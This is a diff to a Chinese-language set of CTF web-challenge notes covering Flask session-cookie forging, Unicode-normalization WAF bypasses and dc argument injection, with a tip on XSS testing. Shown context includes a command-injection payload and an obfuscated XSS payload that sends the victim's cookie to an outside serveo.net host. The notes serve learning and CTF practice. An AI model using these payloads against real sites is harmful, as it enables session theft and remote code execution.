@@ -2545,8 +2545,9 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
 - 其他wp： https://hackmd.io/@pilvar/ByznZMLF3
 258. [Rose](https://hackmd.io/@taiwhis/tenable_ctf_2023#Rose)
 - flask的flask_login以及`@login_required`装饰器依赖客户端的session cookie。只要获取到secret key后，即可伪造登录后的cookie。`{'_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '1'}`. `_id`和`_user_id`是必须的，用于标记已登录（或者说绕过`@login_required`保护的页面），除此之外还可以加其他题目需要的内容
+    - https://github.com/Connor-Maddison/ctf_event_writeups/blob/main/tenable_ctf_2023/rose/Rose_writeup.md ：似乎在session里加上`'is_authenticated': True, '_user_id': '1'`也是可以的
 259. [Bad Waf No Donut](https://hackmd.io/@taiwhis/tenable_ctf_2023#Bad-Waf-No-Donut)
-- [unicode-normalization](https://hacktricks.boitatech.com.br/pentesting-web/unicode-normalization-vulnerability):字符串经过unicode标准化后，某些不一样的unicode字符最后会标准化成一个。可利用这个特点绕过一些waf和过滤。unicode参考： https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
+- [unicode-normalization](https://hacktricks.boitatech.com.br/pentesting-web/unicode-normalization-vulnerability):字符串经过unicode标准化后，某些不一样的unicode字符最后会标准化成一个。可利用这个特点绕过一些waf和过滤。unicode参考： https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html ， https://qaz.wtf/u/convert.cgi
 260. [sequence_gallery](https://siunam321.github.io/ctf/CrewCTF-2023/Web/sequence_gallery/)
 - linux dc命令参数注入导致的rce。`-e`选项可以执行一个表达式，但当表达式中出现`!`时，会将剩余的语句当作系统命令执行。
     - `-e"!cat$IFS*.txt%0A`：第一个`"`用于分割命令（这种情况下不是必须的，详情见文档。本来标准是用空格的，这里绕过滤），`$IFS`表示空格也是绕过滤，`%0A`表示换行，不换行命令是不会执行的
@@ -2612,3 +2613,4 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
     ```html
     <K ID=A><DIV ID=B><IMG SRC ID=AA ONERROR=DOT=[A[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]+[]][0];AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]=`HTTPS:`+DOT[5]+DOT[5]+`IMBRIUM`+DOT[18]+`SERVEO`+DOT[18]+`NET?C=`+AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][5]+[A+[]][0][1]+[A+[]][0][1]+[A+[]][0][14]+[B+[]][0][13]+[A+[]][0][4]]>
     ```
+266. 测试xss时，payload不要只用简单的`alert(1)`,建议用`alert(document.domain)`和`alert(window.origin)`，这些payload可以反馈payload被执行的位置。 https://liveoverflow.com/do-not-use-alert-1-in-xss/
